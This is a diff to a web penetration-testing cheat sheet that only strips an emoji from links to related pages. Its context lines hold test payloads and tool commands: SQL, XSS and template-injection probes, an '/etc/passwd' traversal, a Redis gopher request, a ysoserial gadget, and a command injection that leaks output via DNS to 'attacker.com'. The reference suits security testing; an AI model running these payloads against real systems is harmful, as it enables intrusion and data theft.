@@ -32,7 +32,7 @@ admin'--
 
 ##  **SQL INJECTION**
 *Present when: User input directly concatenated into SQL queries*
-Detailed cheatsheet: [SQL Injection](../../🌐%20Web%20Application/Injections/SQL%20Injection.md)
+Detailed cheatsheet: [SQL Injection](../../Web%20Application/Injections/SQL%20Injection.md)
 
 **Manual:** Add `'` to parameters, observe errors, test time delays
 **Automated:**
@@ -54,7 +54,7 @@ ghauri -u "target.com/page?id=1"
 
 ## **XSS**
 *Present when: User input reflected in HTML without proper encoding*
-Also see [Cross-Site Scripting (XSS)](../../🌐%20Web%20Application/Injections/Cross-Site%20Scripting%20(XSS).md)
+Also see [Cross-Site Scripting (XSS)](../../Web%20Application/Injections/Cross-Site%20Scripting%20(XSS).md)
 **Manual:** Insert `<script>alert(1)</script>` in all inputs, check response
 **Automated:**
 ```bash
@@ -72,7 +72,7 @@ dalfox url target.com
 
 ## **COMMAND INJECTION**
 *Present when: User input passed to system commands without sanitization*
-Also see: [Command Injection](../../🌐%20Web%20Application/Injections/Command%20Injection.md)
+Also see: [Command Injection](../../Web%20Application/Injections/Command%20Injection.md)
 **Manual:** Test with `;`, `&&`, `|` followed by commands like `whoami`
 **Automated:**
 ```bash
@@ -91,7 +91,7 @@ $(nslookup whoami.attacker.com)
 
 ## **FILE UPLOAD**
 *Present when: File uploads lack proper validation and execution prevention*
-Also see: [Insecure File Uploads](../../🌐%20Web%20Application/Insecure%20File%20Uploads.md)
+Also see: [Insecure File Uploads](../../Web%20Application/Insecure%20File%20Uploads.md)
 **Manual:** Upload various file types, check execution in upload directory
 **Automated:**
 ```bash
@@ -131,7 +131,7 @@ gopher://127.0.0.1:6379/_SET test 1
 
 ## **SSTI**
 *Present when: User input embedded in template engines without sandboxing*
-Also see: [Server-Side Template Injection (SSTI)](../../🌐%20Web%20Application/Injections/Server-Side%20Template%20Injection%20(SSTI).md)
+Also see: [Server-Side Template Injection (SSTI)](../../Web%20Application/Injections/Server-Side%20Template%20Injection%20(SSTI).md)
 **Manual:** Test with `{{7*7}}`, `${7*7}`, observe if calculation occurs
 **Automated:**
 ```bash
@@ -153,7 +153,7 @@ nuclei -u target.com -t ssti/
 
 ## **PATH TRAVERSAL/LFI**
 *Present when: File paths constructed from user input without validation*
-Also see: [Local File Inclusion (LFI)](../../🌐%20Web%20Application/File%20Inclusion/Local%20File%20Inclusion%20(LFI).md)
+Also see: [Local File Inclusion (LFI)](../../Web%20Application/File%20Inclusion/Local%20File%20Inclusion%20(LFI).md)
 **Manual:** Replace filenames with `../../../etc/passwd`, observe responses
 **Automated:**
 ```bash
@@ -193,7 +193,7 @@ ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "calc"
 
 ## **IDOR**
 *Present when: Object IDs in URLs/parameters lack proper authorization checks*
-Also see: [Insecure Direct Object Reference (IDOR)](../../🌐%20Web%20Application/Access%20Control/Insecure%20Direct%20Object%20Reference%20(IDOR).md)
+Also see: [Insecure Direct Object Reference (IDOR)](../../Web%20Application/Access%20Control/Insecure%20Direct%20Object%20Reference%20(IDOR).md)
 **Manual:** Change numeric IDs, UUIDs, usernames in parameters
 **Automated:**
 ```bash
@@ -317,7 +317,7 @@ nuclei -u target.com -t clickjacking/
 
 ## **CSRF (CROSS-SITE REQUEST FORGERY)**
 *Present when: State-changing requests lack proper anti-CSRF tokens*
-[Cross-Site Request Forgery (CSRF)](../../🌐%20Web%20Application/Request%20Forgery/Cross-Site%20Request%20Forgery%20(CSRF).md)
+[Cross-Site Request Forgery (CSRF)](../../Web%20Application/Request%20Forgery/Cross-Site%20Request%20Forgery%20(CSRF).md)
 **Manual:** Remove CSRF tokens, check if requests still work
 **Automated:**
 ```bash
